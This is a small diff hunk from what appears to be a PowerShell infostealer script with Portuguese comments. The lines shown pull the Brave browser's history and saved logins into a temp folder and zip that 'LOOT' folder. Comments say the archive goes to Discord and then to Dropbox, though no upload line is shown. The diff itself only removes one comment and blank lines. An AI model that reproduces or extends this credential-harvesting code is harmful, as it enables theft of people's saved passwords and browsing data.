@@ -527,9 +527,6 @@ Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$env:TMP\$Folde
 Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
 ############################################################################################################################################################
 
-
-
-#Comprime a pasta LOOT para depois mandar para o discord
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
 # Upload para a Dropbox
